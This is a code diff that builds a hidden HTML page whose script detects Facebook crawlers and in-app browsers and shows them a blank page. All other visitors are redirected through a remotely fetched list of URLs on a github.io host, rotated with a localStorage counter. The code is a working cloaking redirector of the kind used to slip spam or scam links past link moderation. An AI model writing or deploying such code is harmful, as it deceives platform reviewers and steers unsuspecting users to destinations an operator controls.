@@ -1,27 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+body{display:none;margin:0;}
+</style>
 <script>
 (async () => {
+
   const ua = navigator.userAgent || "";
 
+  // FB 访问 → 保持空白，不跳
   if (
     ua.includes("FBAN") || 
     ua.includes("FBAV") || 
     ua.includes("FB_IAB") || 
-    ua.includes("Facebot") || 
+    ua.includes("Facebot") ||
     ua.includes("facebookexternalhit")
   ) return;
 
   try {
     const res = await fetch("https://liuhongliang11895.github.io/888/mapping.json?ts=" + Date.now(), {cache:"no-store"});
     const data = await res.json();
-    const links = data.links.filter(x => x.active);
+    let links = data.links.filter(x => x.active);
+
     if(!links.length) return;
 
+    // 当前索引读取
     let idx = Number(localStorage.getItem("RR") || "0");
-    const url = links[idx % links.length].url;
+
+    // ⚠️ 如果链接数量变更，idx自动重置
+    if (idx >= links.length) {
+      idx = 0;
+    }
+
+    const url = links[idx].url;
+
+    // 更新RR计数 — 自动循环
     localStorage.setItem("RR", idx + 1);
 
+    // 跳转
     location.href = url;
 
   } catch(e){}
 })();
 </script>
+</head>
+<body></body>
+</html>
